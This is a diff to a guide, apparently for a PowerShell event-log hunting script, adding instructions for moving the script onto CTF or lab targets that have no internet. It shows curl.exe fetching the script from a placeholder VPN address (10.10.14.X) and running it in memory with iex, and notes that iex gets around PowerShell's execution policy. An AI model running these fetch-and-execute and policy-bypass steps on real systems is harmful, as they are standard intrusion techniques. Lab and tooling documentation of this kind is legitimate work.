@@ -70,6 +70,44 @@ The `iex` form is the one to reach for on a locked-down host: dot-sourcing a
 *"running scripts is disabled on this system"*, while `iex` of a string is not.
 Nothing touches disk either way.
 
+### On a box with no internet
+
+Which is most of them. A CTF or lab target usually has no egress at all, so
+`irm` fails before it starts:
+
+```
+irm : The remote name could not be resolved: 'raw.githubusercontent.com'
+```
+
+That is DNS, not the tool. Serve the file from your own machine instead — the
+target can reach you over the VPN even when it cannot reach the internet:
+
+```bash
+# on your box
+cd hunt && python3 -m http.server 8000
+```
+
+```powershell
+# on the target, where 10.10.14.X is your VPN address
+curl.exe -s -o C:\Windows\Temp\hunt.ps1 http://10.10.14.X:8000/hunt.ps1
+(Get-Item C:\Windows\Temp\hunt.ps1).Length     # compare against the real size
+iex (Get-Content C:\Windows\Temp\hunt.ps1 -Raw)
+```
+
+Download first and check the length rather than piping straight into `iex`.
+`python3 -m http.server` truncates large files to Windows clients at a
+different byte count each time, and a half-delivered script fails as a parse
+error somewhere in the middle of the catalogue rather than as a transfer
+problem. `impacket-smbserver share . -smb2support` and a plain `copy` does not
+have that failure mode.
+
+If a box *does* have egress and `irm` still fails, Windows PowerShell 5.1
+negotiates TLS 1.0 by default and GitHub refuses it:
+
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+```
+
 ## The three commands that matter
 
 The hard part of event-log hunting is not the syntax, it is knowing *where* to
